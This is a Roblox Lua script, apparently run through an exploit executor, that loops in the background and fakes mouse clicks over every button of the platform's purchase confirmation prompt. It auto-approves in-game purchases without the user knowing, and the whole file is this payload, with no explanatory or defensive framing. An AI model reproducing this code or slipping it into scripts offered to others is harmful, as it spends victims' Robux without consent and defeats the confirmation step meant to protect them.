_G.owo = true
spawn(function()
  while true do
    if not task.wait(0.1) or not _G.owo then
      break
    end
    
    local success = pcall(function()
        local coreGui = game:GetService("CoreGui")
        local purchasePrompt = coreGui:FindFirstChild("PurchasePrompt")
        
        if not purchasePrompt then return end
        
        local container = purchasePrompt:FindFirstChild("ProductPurchaseContainer")
        if not container then return end
        
        local animator = container:FindFirstChild("Animator")
        if not animator then return end
        
        local prompt = animator:FindFirstChild("Prompt")
        if not prompt then return end
        
        local alertContents = prompt:FindFirstChild("AlertContents")
        if not alertContents then return end
        
        local footer = alertContents:FindFirstChild("Footer")
        if not footer then return end
        
        local buttons = footer:FindFirstChild("Buttons")
        if not buttons then return end
        
        for i = 1, 10 do
            local button = buttons:FindFirstChild(tostring(i))
            if button then
                local pos = button.AbsolutePosition
                local size = button.AbsoluteSize
                
                for x = 50, size.X - 50, 50 do
                    for y = 20, size.Y - 20, 20 do
                        pcall(function()
                            game:GetService("VirtualInputManager"):SendMouseButtonEvent(pos.X + x, pos.Y + y, 0, true, game, 1)
                            task.wait(0.05)
                            game:GetService("VirtualInputManager"):SendMouseButtonEvent(pos.X + x, pos.Y + y, 0, false, game, 1)
                        end)
                    end
                end
            end
        end
    end)
    
    if not success then
    end
  end
end)
return
